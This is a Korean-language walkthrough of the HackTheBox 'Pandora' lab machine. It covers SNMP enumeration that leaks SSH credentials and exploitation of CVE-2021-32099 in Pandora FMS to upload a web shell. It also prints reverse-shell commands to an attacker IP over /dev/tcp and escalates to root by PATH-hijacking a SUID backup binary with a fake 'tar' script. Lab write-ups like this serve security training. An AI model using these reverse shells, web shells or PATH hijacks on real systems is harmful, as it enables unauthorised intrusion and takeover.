# Pandora - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA pandora 10.129.18.147
```
<img width="1104" height="426" alt="image" src="https://github.com/user-attachments/assets/de1533e7-9ac5-49e3-8580-b334e5d44454" />

- SSH(22)
- HTTP(80)

<br>

<img width="1104" height="201" alt="image" src="https://github.com/user-attachments/assets/a5da99d4-636a-4c6c-8423-a39641a0c276" />

- SNMP(161)

---
## SNMP
- `snmpbulkwalk`로 데이터 수집.
- `daniel` 계정 발견.
```bash
snmpbulkwalk -c public -v2c 10.129.18.147 . >result
```
<img width="1104" height="289" alt="image" src="https://github.com/user-attachments/assets/a62a9dd2-c083-4647-9162-7c8f58e2f24a" />

<br>
<br>

- `daniel:HotelBabylon23` SSH 접속 시도하여 성공.
```bash
ssh daniel@10.129.18.147
```
<img width="1104" height="40" alt="image" src="https://github.com/user-attachments/assets/84eb2d2d-08d2-42e0-a0ea-aa8cad2b2368" />

---
## CVE-2021-32099
- `/etc/apache2/sites-enabled`에서 원격에서만 접속할 수 있는 `VHOST` 발견.
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/6789da48-5f5e-4b87-8263-9e7bca8c4a0d" />

<br>
<br>

- SSH 터널링을 생성하여 로컬에서 접속 시도.
- `Pandora FMS 7.0NG.742`
```bash
ssh -L 8000:localhost:80 daniel@10.129.18.147
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/846ebb87-a1bb-47f0-bada-e21a8699df46" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2021-32099
<img width="1212" height="395" alt="image" src="https://github.com/user-attachments/assets/7a21916b-9ea4-4741-83b7-4287c9abcd2f" />

<br>
<br>

- https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated
- `proxies`를 설정.
<img width="1104" height="40" alt="image" src="https://github.com/user-attachments/assets/aed33ebf-1fe2-4d9b-b045-1b05d763e6aa" />

<br>
<br>

<img width="1104" height="45" alt="image" src="https://github.com/user-attachments/assets/7c845b1b-35ed-40a6-8419-1c76217b84cb" />

<br>
<br>

<img width="1104" height="41" alt="image" src="https://github.com/user-attachments/assets/779849b6-f11b-4dbe-9eb3-303362e8aeab" />

<br>
<br>

- 스크립트를 실행하고 `burpsuite`로 가로채서 확인.
```bash
python3 sqlpwn.py -t 127.0.0.1:8000
```
<img width="1548" height="198" alt="image" src="https://github.com/user-attachments/assets/7445d076-e87a-4d2b-b0cb-1d45855e1b2d" />

<br>
<br>

- 웹 셸 업로드.
<img width="1548" height="417" alt="image" src="https://github.com/user-attachments/assets/a60defce-a70c-41e3-84ba-c8fcd39e5e15" />

<br>
<br>

- 명령어 실행 성공.
<img width="589" height="96" alt="image" src="https://github.com/user-attachments/assets/2806b365-04d3-48e7-8c25-9a85ae0a6962" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://127.0.0.1:8000/pandora_console/images/pwn.php?test=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22'
```
<img width="1101" height="62" alt="image" src="https://github.com/user-attachments/assets/bcc8b488-99f5-48c5-8b64-ff4bd3393123" />

<br>
<br>

- 셸 획득.
<img width="1101" height="176" alt="image" src="https://github.com/user-attachments/assets/6812fd45-4093-4805-a431-60672effa6dd" />

---
## Privesc
- `/usr/bin/pandora_backup`에 SUID가 설정되어 있음.
```bash
find / -perm -4000 2>/dev/null
```
<img width="1101" height="345" alt="image" src="https://github.com/user-attachments/assets/786652f2-c89a-462f-8187-d8912b3582c2" />

<br>
<br>

- SUID가 설정되어 있음에도 `/usr/bin/pandora_backup`를 실행하면 제대로 실행이 되지 않는 것처럼 확인 됨.
```bash
/usr/bin/pandora_backup
```
<img width="1101" height="133" alt="image" src="https://github.com/user-attachments/assets/e2df7ba5-417b-4ada-8ca7-62c9ccb7e5c0" />

<br>
<br>

- VHOST를 확인할 때 살펴 본 `pandora.conf`에 `AssignUserID`가 설정되어 있음.
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/c44a85b0-7ca0-47a8-851f-e41cffb34027" />

<br>
<br>

- 해당 셸로는 제약이 걸려있는 것으로 확인되어 SSH 접속을 시도.
- SSH KEY 생성.
```bash
ssh-keygen -t ed25519
```
<img width="1104" height="420" alt="image" src="https://github.com/user-attachments/assets/fc6f7408-92fe-4677-a519-c38ca6d806b4" />

<br>
<br>

- 로컬의 public key를 `authorized_keys`에 추가.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKeRiGuWWamvfr+ym0HgK+DcR5HpjLAVA3rFiWdC6yb3 kali@kali' > authorized_keys
```
<img width="1104" height="42" alt="image" src="https://github.com/user-attachments/assets/41a81004-c96d-4b9e-90bb-2d096e15215d" />

<br>
<br>

- 로컬에서 접속.
```bash
ssh matt@10.129.18.147
```
<img width="1104" height="42" alt="image" src="https://github.com/user-attachments/assets/57036d60-0289-48b3-bfd2-2c2c559e8f48" />

<br>
<br>

- `/usr/bin/pandora_backup` 정상 실행.
<img width="1104" height="294" alt="image" src="https://github.com/user-attachments/assets/9d5a590c-0b1c-4ae2-a14c-fc128f912dd1" />

<br>
<br>

- `ltrace`로 디버깅하여 `tar`를 실행시키는 것을 확인.
```bash
ltrace /usr/bin/pandora_backup
```
<img width="1104" height="343" alt="image" src="https://github.com/user-attachments/assets/905977e5-417c-4b8f-b9dd-4a5968634c34" />

<br>
<br>

- `tar`를 리버스 셸 실행 코드로 생성하고 환경변수를 수정하면 exploit이 가능할 것이라 예상.
- 리버스 셸 생성.
```bash
echo '#!/bin/bash' > tar

echo 'bash -c "bash -i >&/dev/tcp/10.10.14.23/80 0>&1"' >> tar

chmod 777 tar
```
<img width="1104" height="116" alt="image" src="https://github.com/user-attachments/assets/d99659c2-ceb2-45a7-bbe9-20bec2330113" />

<br>
<br>

- `/home/matt`를 `PATH` 변수의 앞에 추가.
```bash
export PATH=/home/matt:$PATH
```
<img width="1104" height="59" alt="image" src="https://github.com/user-attachments/assets/cddbe3cf-546d-494a-89dc-ad1b20045e13" />

<br>
<br>

- `/usr/bin/pandora_backup`를 실행시켜 `root` 획득.
<img width="1104" height="145" alt="image" src="https://github.com/user-attachments/assets/b5d51121-207a-41d3-b67a-2bd72d1fcc48" />

---
## FLAG
- `/home/matt/user.txt`
<img width="1104" height="269" alt="image" src="https://github.com/user-attachments/assets/35b72ac5-c431-4f64-93ba-e634e2be5c71" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="269" alt="image" src="https://github.com/user-attachments/assets/a343e45d-a43c-46c5-819e-f48bc92f3f31" />
